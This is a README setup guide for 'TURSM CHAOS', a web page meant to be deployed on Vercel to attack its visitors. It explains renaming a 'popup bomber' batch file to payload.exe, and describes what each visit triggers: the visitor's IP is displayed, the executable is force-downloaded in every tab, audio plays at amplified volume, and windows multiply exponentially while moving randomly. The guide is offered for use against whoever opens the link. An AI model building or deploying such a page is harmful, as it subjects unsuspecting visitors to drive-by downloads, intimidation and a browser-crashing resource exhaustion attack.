TURSM CHAOS — SETUP GUIDE
==========================

FILES IN THIS ZIP:
  index.html   — the main chaos page
  vercel.json  — vercel config (correct headers for exe download)
  payload.bat  — popup bomber (rename/wrap as payload.exe)
  music.mp3    — ADD YOUR OWN (drop it in this folder)
  README.txt   — this file

SETUP STEPS:
  1. add your music.mp3 to this folder
  2. rename payload.bat → payload.exe
     OR use a bat-to-exe converter (bat_to_exe_converter.exe is free)
  3. push this folder to a github repo (public)
  4. go to vercel.com → New Project → import that repo → Deploy
  5. visit the deployed URL — chaos starts

WHAT HAPPENS ON VISIT:
  • your IP is fetched + displayed under "@tursm got you"
  • payload.exe downloads immediately
  • music.mp3 plays at max volume (amplified 4x via AudioContext)
  • windows start opening — same page — each one also opens more
  • all windows move and resize randomly at 120ms intervals
  • every new tab also downloads payload.exe
  • status text cycles through scary-looking messages
  • exponential: each tab opens 3 more → hundreds within seconds

NOTES:
  • first tab may need one mouse movement to bypass autoplay policy
  • every tab after that starts automatically
  • on vercel free tier: no size limit issues for this project
